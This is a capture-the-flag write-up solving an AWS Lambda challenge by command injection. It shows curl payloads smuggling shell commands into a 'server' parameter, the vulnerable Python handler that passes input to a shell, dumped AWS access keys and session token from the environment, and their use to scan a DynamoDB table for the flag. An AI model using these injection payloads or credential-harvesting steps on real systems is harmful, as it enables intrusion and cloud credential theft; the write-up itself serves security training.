# Solution - by bashNinja

This looked like a build on the last challenge. Let's attempt the same command injection.

```
$ curl -G --data-urlencode "server=;id;1.1.1.1" https://nw7gb3ln3c.execute-api.us-west-2.a
mazonaws.com/Prod/v11?server=192.168.1.1
"Hello from Lambda!b'\\nuid=994(sbx_user1051) gid=991 groups=991\\n'"
```

Yup. Ok now what? Let's dig around again. Also adding a `sed` in there to cleanup the output.

```
$ curl l -s -G --data-urlencode "server=;ls;1.1.1.1" https://nw7gb3ln3c.execute-api.us-west-2.amazonaws.com/Prod/v11?server=192.168.1.1 | sed 's|\\\\n|\n|g'
"Hello from Lambda!b'
app.py
app.py.bk001
certifi
certifi-2020.6.20.dist-info
chardet
chardet-3.0.4.dist-info
idna
idna-2.10.dist-info
__init__.py
requests
requests-2.24.0.dist-info
requirements.txt
urllib3
urllib3-1.25.11.dist-info

$ curl l -s -G --data-urlencode "server=;cat app.py;1.1.1.1" https://nw7gb3ln3c.execute-api.us-west-2.amazonaws.com/Prod/v11?server=192.168.1.1 | sed 's|\\\\n|\n|g'
"Hello from Lambda!b'
import json
import boto3
import subprocess

def lambda_handler(event, context):
    sReturn = \\'Hello from Lambda!\\'
    #
    headers = event[\\'headers\\']
    #
    if \\'queryStringParameters\\' in event:
        dQueryStringParameters = event[\\'queryStringParameters\\']
        if \\'server\\' in dQueryStringParameters:
            sServerGetParm = str(dQueryStringParameters[\\'server\\'])
            result = subprocess.run(\\'echo \\' + sServerGetParm + \\'\\' + \" | sed \\'s:[^.]*$:0/24:\\'\", stdout=subprocess.PIPE,
                                    shell=True)
            sReturn = sReturn + str(result.stdout)
        #
        if \\'continent\\' in dQueryStringParameters:
            try:
                sContinentGetParm = str(dQueryStringParameters[\\'continent\\'])
                #
                dynamodb = boto3.resource(\\'dynamodb\\')
                table = dynamodb.Table(\"continent\")
                items = table.get_item(Key={\"name\": sContinentGetParm})
                #
                sReturn = sReturn + str(items[\\'Item\\'][\\'name\\'] + \" has a population of \" + items[\\'Item\\'][\\'population\\'])
            except Exception as e:
                print(\"[!] Error in dynamodb call: \" + str(e))
    #
    return {
        \\'statusCode\\': 200,
        \\'body\\': json.dumps(sReturn)
    }
'"
```

Awesome. We got source code for the `continent` stuff. If you read into it, you see that it's loading data from dynamodb. Since the challenges says "Can you find the data in the database?" that's probably where we're looking.

I didn't know much about boto3 so I did some reading.

https://boto3.amazonaws.com/v1/documentation/api/latest/guide/quickstart.html

The important things I learned by reading the documentation is that the keys are stored in 2 places: `~/.aws/credentials` or `Environment variables`. You can read that here: 

https://boto3.amazonaws.com/v1/documentation/api/latest/guide/configuration.html#guide-configuration

```
$ curl l -s -G --data-urlencode "server=;cat ~/.aws/credentials;1.1.1.1" https://nw7gb3ln3c.execute-api.us-west-2.amazonaws.com/Prod/v11?server=192.168.1.1 | sed 's|\\\\n|\n|g'
"Hello from Lambda!b'

$ curl l -s -G --data-urlencode "server=;printenv;1.1.1.1" https://nw7gb3ln3c.execute-api.us-west-2.amazonaws.com/Prod/v11?server=192.168.1.1 | sed 's|\\\\n|\n|g'
"Hello from Lambda!b'
AWS_LAMBDA_FUNCTION_VERSION=$LATEST
AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEF4aCXVzLXdlc3QtMiJHMEUCIQDrWOy/urUSLLiSGGgFbe1bt/POj9nGsjm0hsW+EpUAUAIgRwFr/u/r2zXCzEudnAzpOFEKgjtKs+F4xNriQIrDHfsq9AEIt///////////ARABGgw4MTE3MTg5Mjg3ODMiDCok8bI+jdeohEO4JSrIAQnuE8UH4d8hn6ePvqYJf/aI5m7aM1erfMeq+T9I48td2g4tHyKCLZme03k3XpvMvr7JB39Cfp6DpPZ+xkan4rQj09w/LENNR6jYKMycGn291Yk4d78q8ieR16pFt/Bu3ath8EbEZo5EnB1YB70I57oeHpwQufWRDqfjK13kkmdY8nGBEVx9P4GGuxOG5Zf1erBkU33lW9t/sdLcVuuzy9V5Fk/+0jsuuu4awxVUhPZE8Wl6buZu6Q9jK4MJa7Jt2Gd8Wgb+OYBQMKHeg/0FOuABrSpq92uXn/6AS+xfLA8mroAj0hK4VP4y7bnu3xYH7Ru50XgFCbiCW1EwcKZ7pPCougIrTJubN9VsAg9rrpSsgeY/p1tBHuku5u9mYDnlFUkq9EmzUQDuE/UgWxoO4FDc8aFxt+C90TtHUUSnGTxveziCplrPCqZLOkqU3O3ixRI8jJVXvqNpq9kT/nAzObdcM7X65BhITVxSN6vtrYF+bX4mZwNrKn9AKAMnw1PK7XoSfrGEykWSrBgst5U3khosRSyRYHsDeKGFocTHZCFI/FMrcFfsQM2Rs2+e/7w6xTE=
LD_LIBRARY_PATH=/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib
LAMBDA_TASK_ROOT=/var/task
AWS_LAMBDA_LOG_GROUP_NAME=/aws/lambda/sam011sc001-HelloWorldFunction-1KDNQUT68BNEP
AWS_LAMBDA_LOG_STREAM_NAME=2020/11/03/[$LATEST]af3f061681dc4f9b81fbb04b4a15758c
AWS_LAMBDA_RUNTIME_API=127.0.0.1:9001
AWS_EXECUTION_ENV=AWS_Lambda_python3.7
AWS_LAMBDA_FUNCTION_NAME=sam011sc001-HelloWorldFunction-1KDNQUT68BNEP
AWS_XRAY_DAEMON_ADDRESS=169.254.79.2:2000
PATH=/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin
AWS_DEFAULT_REGION=us-west-2
PWD=/var/task
AWS_SECRET_ACCESS_KEY=AKWECTRNa6fehhBmCyrF6Uei7IE8+NqcCWmWIkns
LAMBDA_RUNTIME_DIR=/var/runtime
LANG=en_US.UTF-8
AWS_REGION=us-west-2
TZ=:UTC
AWS_ACCESS_KEY_ID=ASIA3Z7RX5GHRPOZGJMJ
SHLVL=1
_AWS_XRAY_DAEMON_ADDRESS=169.254.79.2
_AWS_XRAY_DAEMON_PORT=2000
_X_AMZN_TRACE_ID=Root=1-5fa0f0eb-4bf75e8a1227a8c92a514f8f;Parent=24f95d7b38b9dd09;Sampled=0
AWS_XRAY_CONTEXT_MISSING=LOG_ERROR
_HANDLER=app.lambda_handler
AWS_LAMBDA_FUNCTION_MEMORY_SIZE=128
_=/usr/bin/printenv
'"
```

Nice! Looks like it was in the environmental variables. Let's install `aws cli` and see if we can use these keys to access the database.

```
$ export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEF4aCXVzLXdlc3QtMiJHMEUCIQDrWOy/urUSLLiSGGgFbe1bt/POj9nGsjm0hsW+EpUAUAIgRwFr/u/r2zXCzEudnAzpOFEKgjtKs+F4xNriQIrDHfsq9AEIt///////////ARABGgw4MTE3MTg5Mjg3ODMiDCok8bI+jdeohEO4JSrIAQnuE8UH4d8hn6ePvqYJf/aI5m7aM1erfMeq+T9I48td2g4tHyKCLZme03k3XpvMvr7JB39Cfp6DpPZ+xkan4rQj09w/LENNR6jYKMycGn291Yk4d78q8ieR16pFt/Bu3ath8EbEZo5EnB1YB70I57oeHpwQufWRDqfjK13kkmdY8nGBEVx9P4GGuxOG5Zf1erBkU33lW9t/sdLcVuuzy9V5Fk/+0jsuuu4awxVUhPZE8Wl6buZu6Q9jK4MJa7Jt2Gd8Wgb+OYBQMKHeg/0FOuABrSpq92uXn/6AS+xfLA8mroAj0hK4VP4y7bnu3xYH7Ru50XgFCbiCW1EwcKZ7pPCougIrTJubN9VsAg9rrpSsgeY/p1tBHuku5u9mYDnlFUkq9EmzUQDuE/UgWxoO4FDc8aFxt+C90TtHUUSnGTxveziCplrPCqZLOkqU3O3ixRI8jJVXvqNpq9kT/nAzObdcM7X65BhITVxSN6vtrYF+bX4mZwNrKn9AKAMnw1PK7XoSfrGEykWSrBgst5U3khosRSyRYHsDeKGFocTHZCFI/FMrcFfsQM2Rs2+e/7w6xTE=
$ export AWS_REGION=us-west-2
$ export AWS_SECRET_ACCESS_KEY=AKWECTRNa6fehhBmCyrF6Uei7IE8+NqcCWmWIkns
$ export AWS_ACCESS_KEY_ID=ASIA3Z7RX5GHRPOZGJMJ
$ aws dynamodb scan --table-name continent
{
    "Items": [
        {
            "name": {
                "S": "oceania"
            },
            "population": {
                "S": "42,677,813"
            }
        },
        {
            "name": {
                "S": "asia"
            },
            "population": {
                "S": "4,641,054,775"
            }
        },
        {
            "name": {
                "S": "south_america"
            },
            "population": {
                "S": "430,759,766"
            }
        },
        {
            "name": {
                "S": "europe"
            },
            "population": {
                "S": "747,636,026"
            }
        },
        {
            "name": {
                "S": "antarctica"
            },
            "population": {
                "S": "0"
            }
        },
        {
            "name": {
                "S": "flag_which_is_super_secert_do_not_tell_no_one"
            },
            "population": {
                "S": "weALLcanDANCE"
            }
        },
        {
            "name": {
                "S": "north_america"
            },
            "population": {
                "S": "592,072,212"
            }
        },
        {
            "name": {
                "S": "africa"
            },
            "population": {
                "S": "1,340,598,147"
            }
        }
    ],
    "Count": 8,
    "ScannedCount": 8,
    "ConsumedCapacity": null
}
```

Do you see that!? That's a flag.


# Real Life Application

PrintENV was all it took to get access to the dynmodb. Wow. Just wow. Couldn't they IP lock it, or something? I would suggest reading more about this. Google and Azure are a bit better about this:

https://www.youtube.com/watch?v=gTFPn-Z7Cc4

https://www.youtube.com/watch?v=IgvYYyxWggw

https://www.youtube.com/watch?v=wQ1CuAPnrLM

# Flag

weALLcanDANCE
